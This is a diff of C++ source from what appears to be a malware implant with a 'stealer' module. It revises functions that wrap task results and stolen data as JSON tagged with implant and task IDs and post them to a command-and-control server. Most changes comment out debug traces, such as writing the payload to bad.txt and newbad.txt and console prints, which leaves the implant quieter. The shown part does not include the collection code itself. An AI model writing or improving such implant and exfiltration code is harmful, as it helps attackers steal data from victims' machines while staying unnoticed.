@@ -253,8 +253,8 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     char *postdata = (char*) malloc(length);
     sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":\"%s\",\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
     //std::cout << postdata << std::endl;
-    std::ofstream file("bad.txt");
-    file << postdata;
+    //std::ofstream file("bad.txt");
+    //file << postdata;
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
@@ -358,6 +358,8 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     return result;
 }
 
+
+//Wyatts implementation to work with stealer
 std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, json results, std::string success, std::string command)
 {
     json resp;
@@ -367,39 +369,10 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
     resp["success"] = success;
     resp["command"] = command;
     int length = resp.dump().size();
-    printf("%d\n", length);
+    //printf("%d\n", length);
     char *postdata = (char *)malloc(length); 
     memcpy(postdata, resp.dump().c_str(),length);
-    std::ofstream file("newbad.txt");
-    file << postdata;
-    /*
-    int var1;
-    int var2;
-    if (implant_id > 10)
-    {
-        var1 = 2;
-    }else
-    {
-        var1 = 1;
-    }
-    if (task_id > 10)
-    {
-        var2 = 2;
-    }else
-    {
-        var2 = 1;
-    }
-
-    int temp = var1 + var2 + results.length() + success.length() + command.length();
-    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
-    
-    int length = 78 + temp;
-    char *postdata = (char*) malloc(length);
-    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":%s,\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
-    //std::cout << postdata << std::endl;
-    std::ofstream file("bad.txt");
-    file << postdata;
-    */
+   
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
@@ -434,7 +407,7 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
     std::wstring get_uri(uri.begin(), uri.end());
     LPCWSTR uriptr = get_uri.c_str();
 
-    std::wcout << L"gabbagool " << uriptr << '\n';
+    //std::wcout << L"gabbagool " << uriptr << '\n';
 
 
 
